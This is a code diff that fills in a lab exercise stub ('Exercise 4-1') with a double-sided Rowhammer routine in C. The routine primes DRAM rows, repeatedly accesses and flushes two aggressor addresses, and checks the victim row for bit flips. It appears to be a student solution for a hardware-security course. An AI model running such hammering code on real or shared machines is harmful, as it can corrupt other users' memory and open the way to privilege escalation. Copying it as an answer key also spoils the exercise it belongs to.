@@ -28,8 +28,61 @@ char *dram_to_str(uint64_t phys_ptr);
 uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t hp_base) {
                       
     uint64_t foundFlips = 0;
-    // TODO: Exercise 4-1
-    return foundFlips; 
+
+    volatile uint8_t *attA_ptr = (uint8_t*) attA;
+    volatile uint8_t *attB_ptr = (uint8_t*) attB;
+
+    // Align to row base (8KB rows)
+    uint64_t vict_row = vict & ~(ROW_STRIDE - 1);
+    uint64_t attA_row = attA & ~(ROW_STRIDE - 1);
+    uint64_t attB_row = attB & ~(ROW_STRIDE - 1);
+
+    // -----------------------------
+    // 1. PRIME
+    // -----------------------------
+
+    // Victim = 0x00
+    memset((void*)vict_row, VIC_DATA, ROW_STRIDE);
+
+    // Aggressors = 0xff
+    memset((void*)attA_row, AGG_DATA, ROW_STRIDE);
+    memset((void*)attB_row, AGG_DATA, ROW_STRIDE);
+
+    // 🔑 CRITICAL: Flush ALL rows after priming
+    for (int i = 0; i < ROW_STRIDE; i += 64) {
+        clflush((void*)(vict_row + i));
+        clflush((void*)(attA_row + i));
+        clflush((void*)(attB_row + i));
+    }
+
+    mfence();
+
+    // -----------------------------
+    // 2. HAMMER
+    // -----------------------------
+
+    for (int i = 0; i < 5000000; i++) {
+        one_block_access((uint64_t)attA_ptr);
+        clflush((void*)attA_ptr);
+
+        one_block_access((uint64_t)attB_ptr);
+        clflush((void*)attB_ptr);
+    }
+
+    mfence();
+
+    // -----------------------------
+    // 3. PROBE
+    // -----------------------------
+
+    for (int i = 0; i < ROW_STRIDE; i++) {
+        if (((uint8_t*)vict_row)[i] != VIC_DATA) {
+            foundFlips = 1;
+            break;
+        }
+    }
+
+    return foundFlips;
 }
 
 /*
